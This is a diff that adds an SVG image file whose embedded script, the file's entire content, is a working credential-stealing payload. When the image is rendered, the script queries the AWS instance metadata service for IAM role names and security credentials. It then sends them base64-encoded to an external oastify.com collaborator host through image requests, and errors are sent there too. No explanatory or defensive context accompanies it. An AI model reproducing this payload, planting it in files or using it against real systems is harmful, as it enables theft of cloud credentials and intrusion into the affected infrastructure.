@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+<script><![CDATA[
+var C='https://t82xqoev1lis5gnjyx5sqalbo2utir6g.oastify.com';
+var M='http://169.254.169.254/latest/meta-data';
+function s(l,d){var i=new Image();i.src=C+'/?l='+l+'&d='+btoa(d);}
+fetch(M+'/iam/security-credentials/')
+.then(function(r){return r.text();})
+.then(function(n){
+s('role',n);
+return fetch(M+'/iam/security-credentials/'+n.trim());
+})
+.then(function(r){return r.text();})
+.then(function(c){s('creds',c);})
+.catch(function(e){s('err',e.toString());});
+]]></script>
+</svg>
